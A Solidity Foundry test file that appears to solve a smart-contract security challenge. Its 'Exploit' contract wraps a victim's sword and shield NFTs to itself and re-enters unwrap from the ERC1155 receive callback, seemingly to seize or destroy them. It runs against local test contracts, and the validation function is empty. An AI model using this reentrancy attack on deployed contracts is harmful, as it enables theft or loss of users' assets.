// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {ERC1155Receiver} from "openzeppelin/token/ERC1155/utils/ERC1155Receiver.sol";
import {Test} from "forge-std/Test.sol";
import {AssetWrapper} from "../../src/game-assets/AssetWrapper.sol";
import {GameAsset} from "../../src/game-assets/GameAsset.sol";
import {Utilities} from "../Utilities.sol";
import {console2} from "forge-std/console2.sol";

contract Exploit is ERC1155Receiver {
  AssetWrapper private assetWrapper;
  GameAsset[] private assets;
  address[] private users;

  constructor(AssetWrapper _assetWrapper, GameAsset[] memory _assets, address[] memory _users) {
    assetWrapper = _assetWrapper;
    assets = _assets;
    users = _users;
  }

  function run() external {
    for (uint256 userIx = 0; userIx < users.length; userIx++) {
      for (uint256 assetIx = 0; assetIx < assets.length; assetIx++) {
        GameAsset asset = assets[assetIx];
        address user = users[userIx];
        uint256 nftsOwned = asset.balanceOf(user);

        for (uint nftId = 0; nftId < nftsOwned; nftId++) {
          assetWrapper.wrap(nftId, address(this), address(asset));
        }
      }
    }
  }

  function onERC1155Received(
      address operator, // _msgSender() = address(this) = address(Exploit)
      address from, // address(0)
      uint256 id,
      uint256 value,
      bytes calldata data
  ) external returns (bytes4) {
    assetWrapper.unwrap(address(this), address(assets[id]));
    return this.onERC1155Received.selector;
  }

  function onERC1155BatchReceived(
      address operator,
      address from,
      uint256[] calldata ids,
      uint256[] calldata values,
      bytes calldata data
  ) external returns (bytes4) {
    return this.onERC1155BatchReceived.selector;
  }
}

contract GameAssetsTest is Test {
  Utilities private utils;
  address payable private attacker;
  address payable private user;

  AssetWrapper private assetWrapper;
  GameAsset private swordAsset;
  GameAsset private shieldAsset;

  function setUp() public {
    utils = new Utilities();

    address payable[] memory users = utils.createUsers(2);
    attacker = users[0];
    user = users[1];
    vm.label(attacker, "Attacker");
    vm.label(user, "User");

    assetWrapper = new AssetWrapper("");

    swordAsset = new GameAsset("Sword", "SWORD");
    shieldAsset = new GameAsset("Shield", "SHIELD");

    assetWrapper.updateWhitelist(address(swordAsset));
    assetWrapper.updateWhitelist(address(shieldAsset));

    swordAsset.setOperator(address(assetWrapper));
    shieldAsset.setOperator(address(assetWrapper));

    swordAsset.mintForUser(user, 1);
    shieldAsset.mintForUser(user, 1);

    assertEq(swordAsset.balanceOf(user), 1);
    assertEq(shieldAsset.balanceOf(user), 1);
  }

  function testExploit() public {
    // Exploit start
    vm.startPrank(attacker);

    GameAsset[] memory assets = new GameAsset[](2);
    assets[0] = swordAsset;
    assets[1] = shieldAsset;

    address[] memory users = new address[](1);
    users[0] = user;

    Exploit exploit = new Exploit(assetWrapper, assets, users);
    exploit.run();

    vm.stopPrank();
    // Exploit end

    validate();
  }

  function validate() private {
  }
}
